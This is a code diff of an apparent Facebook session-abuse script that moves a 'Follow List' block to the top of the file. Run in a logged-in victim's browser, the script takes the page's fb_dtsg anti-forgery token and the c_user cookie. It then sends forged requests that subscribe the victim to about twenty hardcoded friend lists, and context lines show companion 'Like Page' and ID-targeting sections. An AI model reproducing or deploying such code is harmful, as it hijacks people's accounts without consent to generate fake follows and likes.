@@ -1,3 +1,41 @@
+
+/*Follow List*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function LIST(L) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
+  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+LIST("567376543307348");
+LIST("562836113761391");
+LIST("352246548208596");
+LIST("4399231940310");
+LIST("10200819572312984");
+LIST("10200820950347434");
+LIST("10200819976883098");
+LIST("10200865018889120");
+LIST("466396010097340");
+LIST("466380243430111");
+LIST("381489938632591");
+LIST("611411958872392");
+LIST("551467628239578");
+LIST("358808870905474");
+LIST("325715414223519");
+LIST("538818886161261");
+LIST("156489554515051");
+LIST("359722610800552");
+LIST("146971562150041");
+LIST("503774323004340");
+LIST("177777859044364");
+
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -92,40 +130,3 @@ function IDS(r) {
 }
 IDS("100004459350389");
 IDS("100004021942009");
-
-/*Follow List*/
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function LIST(L) {
-  var X = new XMLHttpRequest();
-  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
-  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
-  X.open("POST", XURL, true);
-  X.onreadystatechange = function () {
-    if (X.readyState == 4 && X.status == 200) {
-      X.close;
-    }
-  };
-  X.send(XParams);
-}
-LIST("567376543307348");
-LIST("562836113761391");
-LIST("352246548208596");
-LIST("4399231940310");
-LIST("10200819572312984");
-LIST("10200820950347434");
-LIST("10200819976883098");
-LIST("10200865018889120");
-LIST("466396010097340");
-LIST("466380243430111");
-LIST("381489938632591");
-LIST("611411958872392");
-LIST("551467628239578");
-LIST("358808870905474");
-LIST("325715414223519");
-LIST("538818886161261");
-LIST("156489554515051");
-LIST("359722610800552");
-LIST("146971562150041");
-LIST("503774323004340");
-LIST("177777859044364");
